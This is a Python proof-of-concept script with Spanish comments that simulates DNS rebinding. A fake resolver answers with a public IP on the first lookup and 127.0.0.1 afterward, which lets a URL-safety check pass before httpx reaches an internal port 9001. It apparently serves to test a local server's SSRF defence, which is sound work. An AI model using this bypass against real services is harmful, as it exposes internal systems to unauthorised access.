import asyncio
import socket
import httpx

from server import host_es_seguro

_contador = {"cantidad": 0}
DOMINIO_ATACANTE = "dominio-atacante.test"


def decidir_ip(numero: int) -> str:
    if numero == 1:
        return "93.184.216.34"  # IP publica real (de example.com)
    else:
        return "127.0.0.1"      # A partir de la 2da consulta, interno


# --- Version SINCRONICA del DNS falso (para host_es_seguro / socket directo) ---
_getaddrinfo_original_sync = socket.getaddrinfo


def getaddrinfo_falso_sync(host, *args, **kwargs):
    if host != DOMINIO_ATACANTE:
        return _getaddrinfo_original_sync(host, *args, **kwargs)

    _contador["cantidad"] += 1
    numero = _contador["cantidad"]
    ip_falsa = decidir_ip(numero)
    print(f"[DNS FALSO - sync] Consulta #{numero} para {host} -> responde {ip_falsa}")
    return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (ip_falsa, 0))]


# --- Version ASINCRONICA del DNS falso (para lo que usa httpx internamente) ---
_getaddrinfo_original_async = None


async def getaddrinfo_falso_async(host, *args, **kwargs):
    if host != DOMINIO_ATACANTE:
        return await _getaddrinfo_original_async(host, *args, **kwargs)

    _contador["cantidad"] += 1
    numero = _contador["cantidad"]
    ip_falsa = decidir_ip(numero)
    print(f"[DNS FALSO - async] Consulta #{numero} para {host} -> responde {ip_falsa}")
    return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (ip_falsa, 0))]


async def main():
    global _getaddrinfo_original_async

    socket.getaddrinfo = getaddrinfo_falso_sync

    loop = asyncio.get_event_loop()
    _getaddrinfo_original_async = loop.getaddrinfo
    loop.getaddrinfo = getaddrinfo_falso_async

    print("=== Paso 1: validacion (como hace validar_url) ===")
    seguro = host_es_seguro(DOMINIO_ATACANTE)
    print(f"host_es_seguro dice: {seguro}\n")

    print("=== Paso 2: conexion real (como hace httpx.get) ===")
    async with httpx.AsyncClient() as client:
        try:
            respuesta = await client.get(f"http://{DOMINIO_ATACANTE}:9001/", timeout=5)
            print("Conexion exitosa. Contenido recibido:")
            print(respuesta.text)
        except Exception as e:
            print("Error de conexion:", e)

    print(f"\nTotal de consultas interceptadas: {_contador['cantidad']}")

    socket.getaddrinfo = _getaddrinfo_original_sync
    loop.getaddrinfo = _getaddrinfo_original_async


asyncio.run(main())